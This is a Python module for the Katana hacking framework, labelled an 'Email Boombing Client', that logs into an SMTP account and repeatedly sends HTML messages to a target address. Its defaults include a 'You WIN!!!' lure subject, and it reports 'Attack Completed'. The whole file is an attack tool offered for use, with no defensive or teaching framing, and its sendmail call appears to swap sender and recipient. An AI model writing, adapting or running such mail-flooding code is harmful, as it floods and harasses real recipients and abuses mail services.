# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES 
import smtplib,sys,time
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="2.0"
	init.Description        ="Email Boombing Client."
	init.CodeName           ="set/em.boom"
	init.DateCreation       ="27/08/2015"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                              RQ     DESCRIPTION
		'host'   :["smtp.live.com"                  ,True ,'Server host'],
		'port'   :["587"                            ,False,'Port Service'],
		'account':["myemail@hotmail.com"            ,True ,'Account email'],
		'pass'   :["password"                       ,True ,'Password Account'],
		'target' :["target_232@inbox.ru"            ,True ,'Port Service'],
		'subject':["You WIN!!!"                     ,False,'Subject (title)'],
		'file'   :["files/tmtSMTP/updateTwitter.tmp",False,'Message file'],
		'amount' :["10"                             ,False,'Amount to send']

	}
	# EXTRA OPTIONS MODULE
	init.extra = {
		# NAME    VALUE                              RQ     DESCRIPTION
		'sleep'  :["0"                              ,False,'Time of sleep'],
		'tls'    :["true"                           ,False,'TLS Auth']

	}

	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	NET.CheckConnectionHost(init.var['host'],init.var['port'],5)

	try:
		server = smtplib.SMTP(init.var['host'],int(init.var['port']))
		if init.var['tls']=="true": server.starttls()
		server.login(init.var['account'],init.var['pass'])
		Loadingfile(init.var['file'])
		with open(init.var['file'],'r') as body:
			FILE_HTML = ""
			for read_line in body: 
				FILE_HTML += read_line
		message = """\From: %s\nTo: %s\nContent-type: text/html\nSubject: %s\n\n%s""" % (init.var['account'],init.var['target'],init.var['subject'],FILE_HTML)
		try:
			many=0
			while(many < int(init.var['amount'])):
				many+=1
				server.sendmail(init.var['target'], init.var['account'], message)
				printAlert(0,"#"+str(many)+" E-Mail was sent.")
				time.sleep(int(init.var['sleep']))
		except:
			printk.err("E-Mail not was sent.")
		printk.suff("Attack Completed.")
		server.quit()
	except smtplib.SMTPAuthenticationError:
		printk.err("Authentication Required or Authentication went wrong.")
	except:
		error = str(sys.exc_info()[1])
		if error.find("SMTP AUTH extension") >= 0 : 
			printk.err("TLS error, Starting again with TLS.")
			init.var['tls'] = ["true",False,'TLS Auth']
			main(False)

# END CODE MODULE ############################################################################################